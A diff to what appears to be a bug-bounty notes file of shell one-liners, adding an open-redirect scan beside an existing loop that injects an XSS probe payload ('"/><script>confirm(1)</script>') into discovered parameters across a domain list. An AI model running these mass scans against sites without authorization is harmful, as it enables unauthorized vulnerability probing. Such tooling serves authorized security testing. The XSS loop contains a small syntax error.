@@ -3,3 +3,6 @@ for host in $(cat domains);do blc https://$host -ro |grep BROKEN| awk -v host=$h
 
 Param Spiser for XSS
 for i in $(cat recursive_domains);do paramspider -d $i --subs false --placeholder '"/><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done >> vulnerable_xss.txt ;done
+
+Open Redirect
+for i in $(cat domains);do paramspider -d $i |sed 's/FUZZ/ /g' | while read host; do oralyzer -u $host; done;done >> open_redirect.txt
